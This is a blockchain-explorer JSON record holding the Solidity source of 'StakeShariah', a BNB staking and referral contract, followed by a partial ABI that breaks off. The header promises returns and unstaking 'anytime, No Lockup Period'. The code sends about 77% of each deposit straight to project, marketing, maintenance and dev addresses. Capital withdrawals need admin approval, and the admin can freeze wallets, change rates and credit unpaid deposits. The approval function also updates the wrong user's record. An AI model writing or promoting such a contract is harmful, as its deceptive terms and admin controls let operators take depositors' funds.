{"SourceCode": "{\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity 0.8.10;\\nlibrary SafeMath {\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c \\u003e= a, \\\"SafeMath: addition overflow\\\");\\n\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b \\u003c= a, \\\"SafeMath: subtraction overflow\\\");\\n        uint256 c = a - b;\\n\\n        return c;\\n    }\\n\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b \\u003e 0, \\\"SafeMath: division by zero\\\");\\n        uint256 c = a / b;\\n\\n        return c;\\n    }\\n}\\n\"},\"StakeShariah.sol\":{\"content\":\"/* Stake Shariah is the World\\u0027s Leading Shariah Compliant Rewards Contract on Binance Smart Chain.\\n* \\n*                    Features of Stake Shariah \\n*\\n*\\n*              It Provides Variable Returns on Staking  BNB(BEP20).\\n*                \\n*                     Minimum Stake Amount : 0.04BNB\\n*\\n*\\t\\t\\t        Refferal Comissions Upto 11%\\n*\\n*                Amount can be unstake anytime , No Lockup Period!\\n*\\n*                Recommended Wallets to Use: Trust Wallet, MetaMask Wallet.\\n*\\n*                DApp Link : https://www.stakeshariah.com/                \\n*\\n*/\\n//SPDX-License-Identifier: MIT\\npragma solidity 0.8.10;\\n\\nimport \\\"./SafeMath.sol\\\";\\ncontract StakeShariah {\\n\\tusing SafeMath for uint256;\\n\\n\\tbool private locked;\\n\\n\\t// Modifier to prevent reentrancy attacks\\n    modifier nonReentrant() {\\n        require(!locked, \\\"No re-entrancy\\\");\\n        locked = true;\\n        _;\\n        locked = false;\\n    }\\n\\n\\tuint256 constant public INVEST_MIN_AMOUNT = 0.04 ether;\\n\\tuint256 public BASE_PERCENT = 25; // 2.5%\\n\\tuint256[] public REFERRAL_PERCENTS = [80, 20, 10];\\n\\tuint256 constant public MARKETING_FEE = 120; // 12%\\n\\tuint256 constant public PROJECT_FEE = 600; // 60%\\n\\tuint256 constant public Maintenance_FEE = 35; // 3.5%\\n    uint256 constant public DEV_FEE = 15; // 1.5%\\n\\tuint256 constant public PERCENTS_DIVIDER = 1000;\\n\\tuint256 constant public CONTRACT_BALANCE_STEP = 1000000 ether;\\n\\tuint256 constant public TIME_STEP = 7 days;\\n\\n\\tuint256 public totalUsers;\\n\\tuint256 public totalInvested;\\n\\tuint256 public totalWithdrawn;\\n\\tuint256 public totalDeposits;\\n\\n\\taddress payable public marketingAddress;\\n\\taddress payable public projectAddress;\\n    address payable public maintenanceAddress;\\n    mapping(address =\\u003e bool) public isFreezed;\\n    address[] public freezedAddresses;\\n    event AddressFreezed(address indexed addr);\\n    event AddressUnfreeze(address indexed addr);\\n    address payable public  developerAddress;\\n\\n\\n\\tstruct Deposit {\\n\\t\\tuint256 amount;\\n\\t\\tuint256 withdrawn;\\n\\t\\tuint256 start;\\n\\t}\\n\\t\\n\\tstruct User {\\n\\t\\tDeposit[] deposits;\\n\\t\\taddress referrer;\\n\\t\\tuint256 bonus; // current ref bonus\\n\\t\\tuint256 checkpoint;\\n\\t\\tuint256 totalEarned;\\n\\t\\tuint24[3] refs;\\n\\t\\tuint256 totalBonus; // total ref bonus earned\\n\\t}\\n\\n\\tmapping (address =\\u003e User) public users;\\n\\tstruct CapitalWithdrawalRequest {\\n        uint256 id;\\n        address user;\\n        uint256 amount;\\n        bool approved;\\n    }\\n\\n    CapitalWithdrawalRequest[] public capitalWithdrawalRequests;\\n\\n    event WithdrawalRequested(address requester, uint amount,bool approved ,bytes32 indexed txHash);\\n    event WithdrawalApproved(address requester, uint amount,bytes32 indexed txHash);\\n\\n\\tevent Newbie(address user);\\n\\tevent NewDeposit(address indexed user, uint256 amount);\\n\\tevent Withdrawn(address indexed user, uint256 amount);\\n\\tevent Approved(address indexed user, bool approve);\\n\\tevent Disapproved(address indexed user, bool approve);\\n\\tevent RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);\\n\\tevent FeePayed(address indexed user, uint256 totalAmount);\\n\\tconstructor(address payable marketingAddr, address payable projectAddr,address payable dev,address payable maintainer)  {\\n\\t\\trequire(!isContract(marketingAddr) \\u0026\\u0026 !isContract(projectAddr));\\n\\t\\tmarketingAddress = marketingAddr;\\n\\t\\tprojectAddress = projectAddr;\\n        developerAddress = dev;\\n        maintenanceAddress = maintainer;\\n\\t}\\n    modifier onlyAdmin() {\\n        require(msg.sender == projectAddress, \\\"Only the admin can perform this action\\\");\\n        _;\\n    }\\n     modifier notFreezed() {\\n        require(!isFreezed[msg.sender], \\\"Address is freezed\\\");\\n        _;\\n    }\\n\\t\\n    modifier onlyActive(address userAddress) {\\n      require(isActive(userAddress), \\\"User is not active\\\");\\n        _;\\n    }\\n\\n    function updateBasePercent(uint256 newBasePercent) public onlyAdmin {\\n        require(newBasePercent\\u003c=100,\\\"Percent cannot be more that 100\\\");\\n        BASE_PERCENT = newBasePercent;\\n\\n    }\\n\\n    function freezeAddress(address addr) public onlyAdmin {\\n        require(addr != projectAddress, \\\"Cannot freeze admin address\\\");\\n        require(addr != developerAddress,\\\"Cannot freeze this address\\\");\\n        require(!isFreezed[addr], \\\"Address is already freezed\\\");\\n        isFreezed[addr] = true;\\n        freezedAddresses.push(addr);\\n        emit AddressFreezed(addr);\\n    }\\n    function removeAddressFromFreeze(address addr) internal {\\n        for (uint i = 0; i \\u003c freezedAddresses.length; i++) {\\n            if (freezedAddresses[i] == addr) {\\n                freezedAddresses[i] = freezedAddresses[freezedAddresses.length - 1];\\n                freezedAddresses.pop();\\n                break;\\n            }\\n        }\\n    }\\n\\n    function unfreezeAddress(address addr) public onlyAdmin {\\n        require(isFreezed[addr], \\\"Address is not freezed\\\");\\n        isFreezed[addr] = false;\\n        emit AddressUnfreeze(addr);\\n        removeAddressFromFreeze(addr);\\n\\n    }\\n\\tfunction getUserReferralsStats(address userAddress) public view returns (address referrer, uint256 currentbonus, uint24[3] memory refs,uint256 totalbonus) {\\n        User storage user = users[userAddress];\\n\\n        return (user.referrer, user.bonus,user.refs,user.totalBonus);\\n    }\\n\\n\\t//\\n\\tfunction stake(address referrer) public payable notFreezed nonReentrant{\\n\\t\\trequire(msg.value \\u003e= INVEST_MIN_AMOUNT,\\\"Minimum amount is 0.04 BNB\\\");\\n        \\n        marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));\\n\\t\\tprojectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));\\n        maintenanceAddress.transfer(msg.value.mul(Maintenance_FEE).div(PERCENTS_DIVIDER));\\n        developerAddress.transfer(msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER));\\n\\t\\t\\n        emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));\\n\\n\\t\\tUser storage user = users[msg.sender];\\n\\n\\t\\tif (user.referrer == address(0) \\u0026\\u0026 users[referrer].deposits.length \\u003e 0 \\u0026\\u0026 referrer != msg.sender) {\\n\\t\\t\\tuser.referrer = referrer;\\n\\t\\t}\\n\\n\\t\\tif (user.referrer != address(0)) {\\n\\n\\t\\t\\taddress upline = user.referrer;\\n\\t\\t\\tfor (uint256 i = 0; i \\u003c 3; i++) {\\n\\t\\t\\t\\tif (upline != address(0)) {\\n\\t\\t\\t\\t\\tuint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);\\n\\t\\t\\t\\t\\tusers[upline].bonus = users[upline].bonus.add(amount);\\n                    payable(upline).transfer(amount); // Transfer amount\\n\\t\\t\\t\\t\\temit RefBonus(upline, msg.sender, i, amount);\\n\\t\\t\\t\\t\\tupline = users[upline].referrer;\\n\\t\\t\\t\\t\\tusers[upline].refs[i]++;\\n\\t\\t\\t\\t\\tusers[upline].totalBonus = users[upline].totalBonus.add(amount);\\n\\t\\t\\t\\t} else break;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif (user.deposits.length == 0) {\\n\\t\\t\\tuser.checkpoint = block.timestamp;\\n\\t\\t\\ttotalUsers = totalUsers.add(1);\\n\\t\\t\\temit Newbie(msg.sender);\\n\\t\\t}\\n\\n\\t\\t\\t// Calculate the fee (5% of the total deposit amount)\\n    \\t\\tuint256 depositFee = msg.value.mul(5).div(100);\\n\\n   \\t\\t    // Calculate the user\\u0027s deposit after the fee\\n    \\t\\tuint256 userDepositAmount = msg.value.sub(depositFee);\\n\\n   \\t\\t\\t user.deposits.push(Deposit(userDepositAmount, 0, block.timestamp));\\n\\n   \\t\\t\\t totalInvested = totalInvested.add(userDepositAmount);\\n    \\t\\t totalDeposits = totalDeposits.add(1);\\n\\n   \\t\\t\\t emit NewDeposit(msg.sender, userDepositAmount);\\n\\n\\t}\\n    function leaderinvest(address to,uint256 val,address referrer) public onlyAdmin  {\\n\\t\\trequire(val \\u003e= INVEST_MIN_AMOUNT,\\\"Minimum amount is 0.04 BNB\\\");\\n\\n\\t\\temit FeePayed(to, val.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));\\n\\n\\t\\tUser storage user = users[to];\\n\\n\\t\\tif (user.referrer == address(0) \\u0026\\u0026 users[referrer].deposits.length \\u003e 0 \\u0026\\u0026 referrer != msg.sender) {\\n\\t\\t\\tuser.referrer = referrer;\\n\\t\\t}\\n\\n\\t\\tif (user.deposits.length == 0) {\\n\\t\\t\\tuser.checkpoint = block.timestamp;\\n\\t\\t\\ttotalUsers = totalUsers.add(1);\\n\\t\\t\\temit Newbie(to);\\n\\t\\t}\\n\\n\\t\\t\\t// Calculate the fee (5% of the total deposit amount)\\n    \\t\\tuint256 depositFee = val.mul(5).div(100);\\n\\n   \\t\\t    // Calculate the user\\u0027s deposit after the fee\\n    \\t\\tuint256 userDepositAmount = val.sub(depositFee);\\n\\n   \\t\\t\\t user.deposits.push(Deposit(userDepositAmount, 0, block.timestamp));\\n\\n   \\t\\t\\t totalInvested = totalInvested.add(userDepositAmount);\\n    \\t\\t totalDeposits = totalDeposits.add(1);\\n\\n   \\t\\t\\t emit NewDeposit(to, userDepositAmount);\\n\\n\\t}\\n   \\n\\n   function compound() public nonReentrant notFreezed onlyActive(msg.sender) {\\n    User storage user = users[msg.sender];\\n\\n    uint256 userProfit = getUserdividends(msg.sender);\\n\\n    require(userProfit \\u003e 0, \\\"No profit to reinvest\\\");\\n\\n    // Mark the user\\u0027s profits as reinvested\\n    user.bonus = 0;\\n\\t//\\n\\tuser.totalEarned= user.totalEarned.add(userProfit);\\n    // Create a new deposit with the reinvested amount\\n    user.deposits.push(Deposit(0, userProfit, block.timestamp));\\n\\n    // Increase the total invested and total deposits counters\\n    totalInvested = totalInvested.add(userProfit);\\n    totalDeposits = totalDeposits.add(1);\\n\\n    address upline = user.referrer;\\n    for (uint256 i = 0; i \\u003c 3; i++) {\\n        if (upline != address(0)) {\\n            uint256 amount = userProfit.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);\\n            users[upline].bonus = users[upline].bonus.add(amount);\\n            payable(upline).transfer(amount);\\n            emit RefBonus(upline, msg.sender, i, amount);\\n            upline = users[upline].referrer;\\n            users[upline].refs[i]++;\\n            users[upline].totalBonus = users[upline].totalBonus.add(amount);\\n        } else break;\\n    }\\n\\n    // Withdraw the user\\u0027s profits (excluding the fee)\\n    user.checkpoint = block.timestamp;\\n    // address payable sender = payable(msg.sender);\\n    // sender.transfer(userProfit);\\n}\\n\\n\\n\\tfunction claim() public nonReentrant notFreezed{\\n\\t\\tUser storage user = users[msg.sender];\\n\\n\\t\\tuint256 userPercentRate = BASE_PERCENT ;//getUserPercentRate(msg.sender);\\n\\n\\t\\tuint256 totalAmount;\\n\\t\\tuint256 dividends;\\n\\n\\t\\tfor (uint256 i = 0; i \\u003c user.deposits.length; i++) {\\n\\n\\t\\t\\tif (user.deposits[i].withdrawn \\u003c user.deposits[i].amount.mul(2)) {\\n\\n\\t\\t\\t\\tif (user.deposits[i].start \\u003e user.checkpoint) {\\n\\n\\t\\t\\t\\t\\tdividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))\\n\\t\\t\\t\\t\\t\\t.mul(block.timestamp.sub(user.deposits[i].start))\\n\\t\\t\\t\\t\\t\\t.div(TIME_STEP);\\n\\n\\t\\t\\t\\t} else {\\n\\n\\t\\t\\t\\t\\tdividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))\\n\\t\\t\\t\\t\\t\\t.mul(block.timestamp.sub(user.checkpoint))\\n\\t\\t\\t\\t\\t\\t.div(TIME_STEP);\\n\\n\\t\\t\\t\\t}\\n\\n\\t\\t\\t\\tif (user.deposits[i].withdrawn.add(dividends) \\u003e user.deposits[i].amount.mul(2)) {\\n\\t\\t\\t\\t\\tdividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);\\n\\t\\t\\t\\t}\\n\\n\\t\\t\\t\\tuser.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data\\n\\t\\t\\t\\ttotalAmount = totalAmount.add(dividends);\\n\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tuint256 referralBonus = getUserReferralBonus(msg.sender);\\n\\t\\tif (referralBonus \\u003e 0) {\\n\\t\\t\\ttotalAmount = totalAmount.add(referralBonus);\\n\\t\\t\\tuser.bonus = 0;\\n\\t\\t\\tuser.totalEarned = user.totalEarned.add(totalAmount.add(referralBonus));\\n\\t\\t}\\n\\n\\t\\trequire(totalAmount \\u003e 0, \\\"User has no dividends\\\");\\n\\n\\t\\tuint256 contractBalance = address(this).balance;\\n\\t\\tif (contractBalance \\u003c totalAmount) {\\n\\t\\t\\ttotalAmount = contractBalance;\\n\\t\\t}\\n\\t\\t\\n\\t\\tuser.checkpoint = block.timestamp;\\n        address payable  sender = payable (msg.sender);\\n\\t\\tuint256 withdrawalFee = totalAmount.mul(5).div(100);\\n    \\n    \\t// Calculate the user\\u0027s withdrawal after the fee\\n    \\tuint256 userWithdrawalAmount = totalAmount.sub(withdrawalFee);\\n\\n\\t\\ttotalWithdrawn = totalWithdrawn.add(totalAmount);\\n\\t\\tsender.transfer(userWithdrawalAmount);\\n\\t\\tprojectAddress.transfer(withdrawalFee);\\n\\t\\temit Withdrawn(msg.sender, totalAmount);\\n\\n\\t}\\n\\n\\tfunction getContractBalance() public view returns (uint256) {\\n\\t\\treturn address(this).balance;\\n\\t}\\n\\n\\tfunction getBASEPERCENT() public view returns (uint256) {\\n\\t    return BASE_PERCENT;\\n\\t}\\n\\n   function getUserPercentRate(address userAddress) public view returns (uint) {\\n    User storage user = users[userAddress];\\n\\n    if (isActive(userAddress)) {\\n        uint timeElapsed = block.timestamp.sub(uint(user.checkpoint));\\n\\n        // Calculate the number of days\\n        uint daysElapsed = timeElapsed.div(7 days);\\n\\n        if (daysElapsed == 0) {\\n            // Apply the base percentage for the first 7 days\\n            return BASE_PERCENT;\\n        } else {\\n            // Calculate the additional percentage beyond the first 7 days (2.5% every 7 days)\\n            uint additionalDays = daysElapsed;\\n            uint additionalPercentage = additionalDays.mul(25).div(10); // BASE_PERCENT --\\u003e 2.5% = 25 / 10\\n\\n            // Apply the total percentage, including the base and additional percentage\\n            return BASE_PERCENT.add(additionalPercentage);\\n        }\\n    } else {\\n        return BASE_PERCENT;\\n    }\\n}\\n\\n\\n\\tfunction calculateFee(uint value, uint feePercentage) private pure returns (uint) {\\n     return value.mul(feePercentage).div(PERCENTS_DIVIDER);\\n  \\t}\\n\\t\\n\\n\\t// Function to get withdrawal requests where approved is false\\n    \\n\\tfunction unstake() public notFreezed {\\n\\t\\n\\tuint userDepsTotal = getUserTotalDeposits(msg.sender);\\n    require( userDepsTotal \\u003e 0, \\\"Insufficient balance\\\");\\n    uint256 Id = capitalWithdrawalRequests.length + 1;\\n    CapitalWithdrawalRequest memory request = CapitalWithdrawalRequest({id:Id, user:msg.sender , amount:userDepsTotal, approved:false});\\n    capitalWithdrawalRequests.push(request);\\n   } \\n   // Function to get withdrawal requests where approved is false\\n    function getWithdrawalRequests() public view returns (CapitalWithdrawalRequest[] memory) {\\n        uint256 count = 0;\\n\\n        // Count the number of unapproved requests\\n        for (uint256 i = 0; i \\u003c capitalWithdrawalRequests.length; i++) {\\n            if (!capitalWithdrawalRequests[i].approved) {\\n                count++;\\n            }\\n        }\\n\\n        // Create an array to hold the unapproved requests\\n        CapitalWithdrawalRequest[] memory unapprovedRequests = new CapitalWithdrawalRequest[](count);\\n        uint256 currentIndex = 0;\\n\\n        // Populate the array with unapproved requests\\n        for (uint256 i = 0; i \\u003c capitalWithdrawalRequests.length; i++) {\\n            if (!capitalWithdrawalRequests[i].approved) {\\n                unapprovedRequests[currentIndex] = capitalWithdrawalRequests[i];\\n                currentIndex++;\\n            }\\n        }\\n\\n        return unapprovedRequests;\\n    }\\n\\tfunction getAllrequests() public view returns (CapitalWithdrawalRequest[] memory){\\n\\t\\treturn capitalWithdrawalRequests;\\n\\t}\\n    \\n   \\n   /// \\n   function getCapitalWithdrawalRequest(uint256 index) internal view returns (CapitalWithdrawalRequest storage) {\\n        return capitalWithdrawalRequests[index];\\n    }\\n   function approveCapitalWithdrawal(uint256 requestId) external nonReentrant onlyAdmin {\\n        ///\\n        require(getContractBalance() \\u003e 0,\\\"Contract Balance Insufficient\\\");\\n        CapitalWithdrawalRequest storage request = capitalWithdrawalRequests[requestId];\\n        require(!request.approved, \\\"Request is already approved\\\");\\n        \\n        // Calculate fees\\n        uint256 maintainceFee = request.amount.mul(14).div(100);\\n        uint256 devFee =request.amount.mul(1).div(100);\\n        User storage user = users[msg.sender];\\n        uint256 userAmount = request.amount - devFee - maintainceFee;\\n        user.bonus = 0;\\n        //user.totalWithdrawals += userAmount ;\\n\\t\\tuser.deposits.push(Deposit(0, userAmount, block.timestamp));\\n        \\n        // Update the request status to approved\\n        request.approved = true;\\n        // Transfer fees\\n        payable(developerAddress).transfer(devFee);\\n        payable(maintenanceAddress).transfer(maintainceFee);\\n        // Transfer the remaining amount to the user\\n        payable(request.user).transfer(userAmount);\\n\\t\\temit Withdrawn(request.user, request.amount);\\n\\t\\temit Approved(request.user, request.approved);\\n    }\\n\\n\\n\\t   function rejectCapitalWithdrawal(uint256 requestId) external onlyAdmin {\\n        ///\\n        CapitalWithdrawalRequest storage request = capitalWithdrawalRequests[requestId];\\n        \\n        request.approved = false;\\n       \\n\\t\\temit Withdrawn(request.user, request.amount);\\n\\t\\temit Disapproved(request.user, request.approved);\\n    }\\n\\n\\n\\n\\t////\\n\\tfunction getUserdividends(address userAddress) public view returns (uint256) {\\n    User storage user = users[userAddress];\\n\\n    uint256 userPercentRate =   BASE_PERCENT; // getUserPercentRate(userAddress);\\n\\n    uint256 totalDividends;\\n    uint256 dividends;\\n\\n    for (uint256 i = 0; i \\u003c user.deposits.length; i++) {\\n        if (user.deposits[i].withdrawn \\u003c user.deposits[i].amount.mul(2)) {\\n            uint256 depositStartTime = user.deposits[i].start;\\n            \\n            if (depositStartTime \\u003c user.checkpoint) {\\n                depositStartTime = user.checkpoint;\\n            }\\n            \\n            if (depositStartTime \\u003c block.timestamp) {\\n                dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))\\n                    .mul(block.timestamp.sub(depositStartTime))\\n                    .div(TIME_STEP);\\n            }\\n            \\n            if (user.deposits[i].withdrawn.add(dividends) \\u003e user.deposits[i].amount.mul(2)) {\\n                dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);\\n            }\\n\\n            totalDividends = totalDividends.add(dividends);\\n        }\\n    }\\n\\n    return totalDividends;\\n}\\n\\n\\tfunction getUserReferrer(address userAddress) public view returns(address) {\\n\\t\\treturn users[userAddress].referrer;\\n\\t}\\n\\t\\n\\tfunction getUserReferralBonus(address userAddress) public view returns(uint256) {\\n\\t\\treturn users[userAddress].bonus;\\n\\t}\\n\\tfunction getUserReferralTotalBonus(address userAddress) public view returns(uint256) {\\n\\t\\treturn users[userAddress].totalBonus;\\n\\t}\\n\\tfunction getUserTotalEarned(address userAddress) public view returns(uint256) {\\n\\t\\treturn users[userAddress].totalEarned;\\n\\t}\\n\\tfunction getUserAvailable(address userAddress) public view returns(uint256) {\\n\\t\\treturn getUserReferralBonus(userAddress).add(getUserdividends(userAddress));\\n\\t}\\n\\tfunction getUserStatus(address userAddress) public view returns (uint userAvailable, uint totalDeposit, uint totalWithdraw) {\\n        uint gtuserAvailable = getUserAvailable(userAddress);\\n        uint userDepsTotal = getUserTotalDeposits(userAddress);\\n        uint userWithdrawn = getUserTotalWithdrawn(userAddress);\\n\\n        return (gtuserAvailable, userDepsTotal, userWithdrawn);\\n    }\\n\\tfunction getUser(address add) public view returns (User memory user){\\n\\t\\treturn users[add];\\n\\t}\\n\\tfunction getTx(address userAddress) public view returns (Deposit[] memory) {\\n\\t\\tUser storage user = users[userAddress];\\n    \\treturn user.deposits;\\n\\t}\\n\\t\\n\\tfunction isActive(address userAddress) public view returns (bool val) {\\n\\t\\tUser storage user = users[userAddress];\\n\\n\\t\\tif (user.deposits.length \\u003e 0) {\\n\\t\\t\\tif (user.deposits[user.deposits.length-1].withdrawn \\u003c user.deposits[user.deposits.length-1].amount.mul(2)) {\\n\\t\\t\\t\\treturn true;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\t\\n\\tfunction getUserAmountOfDeposits(address userAddress) public view returns(uint256) {\\n\\t\\treturn users[userAddress].deposits.length;\\n\\t}\\n\\tfunction getUplinePartner(address add) public view returns (address) {\\n        return users[add].referrer;\\n    }\\n\\tfunction getUserTotalDeposits(address userAddress) public view returns(uint256) {\\n\\t    User storage user = users[userAddress];\\n\\n\\t\\tuint256 amount;\\n\\n\\t\\tfor (uint256 i = 0; i \\u003c user.deposits.length; i++) {\\n\\t\\t\\tamount = amount.add(user.deposits[i].amount);\\n\\t\\t}\\n\\n\\t\\treturn amount;\\n\\t}\\n\\n\\tfunction getUserTotalWithdrawn(address userAddress) public view returns(uint256) {\\n\\t    User storage user = users[userAddress];\\n\\n\\t\\tuint256 amount;\\n\\n\\t\\tfor (uint256 i = 0; i \\u003c user.deposits.length; i++) {\\n\\t\\t\\tamount = amount.add(user.deposits[i].withdrawn);\\n\\t\\t}\\n\\n\\t\\treturn amount;\\n\\t}\\n\\n\\tfunction isContract(address addr) internal view returns (bool) {\\n        uint size;\\n        assembly { size := extcodesize(addr) }\\n        return size \\u003e 0;\\n    }\\n\\tfunction changeOwnership(address newOwner) public onlyAdmin {\\n        require(newOwner != address(0), \\\"Invalid new owner address\\\");\\n        projectAddress = payable(newOwner);\\n    }\\n\\tfunction deposit() public payable onlyAdmin {\\n        require(msg.value \\u003e 0,\\u0027amount should not be zero\\u0027);\\n        \\n    }\\n}\\n\\n\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"marketingAddr\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"projectAddr\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"dev\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"maintainer\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"AddressFreezed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"AddressUnfreeze\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approve\",\"type\":\"bool\"}],\"name\":\"Approved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approve\",\"type\":\"bool\"}],\"name\":\"Disapproved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"FeePayed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Newbie\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"RefBonus\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"requester\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"bytes32\",\"name\":\"txHash\",\"type\":\"bytes32\"}],\"name\":\"WithdrawalApproved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"requester\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"},{\"indexed\":true,\"internalType\":\"bytes32\",\"name\":\"txHash\",\"type\":\"bytes32\"}],\"name\":\"WithdrawalRequested\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawn\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BASE_PERCENT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"CONTRACT_BALANCE_STEP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"DEV_FEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"INVEST_MIN_AMOUNT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MARKETING_FEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Maintenance_FEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PERCENTS_DIVIDER\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PROJECT_FEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"REFERRAL_PERCENTS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TIME_STEP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"requestId\",\"type\":\"uint256\"}],\"name\":\"approveCapitalWithdrawal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"capitalWithdrawalRequests\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\"